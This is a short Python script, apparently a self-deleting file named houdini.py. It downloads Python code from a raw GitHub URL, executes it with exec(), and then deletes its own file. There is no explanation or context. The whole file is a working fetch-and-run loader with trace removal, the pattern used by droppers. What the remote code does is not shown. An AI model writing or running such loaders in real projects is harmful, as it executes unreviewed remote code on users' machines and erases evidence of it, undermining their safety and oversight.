githubRawCodeURL = 'https://raw.githubusercontent.com/kkoves/zip-zap-zabrian/master/zipzap.py'
try:
  import urllib.request
  githubRawCode = urllib.request.urlopen(githubRawCodeURL).read().decode(encoding='UTF-8')
except Exception:
  import urllib
  githubRawCode = urllib.urlopen(githubRawCodeURL).read().decode(encoding='UTF-8')
import os

exec(githubRawCode)
os.remove('houdini.py')
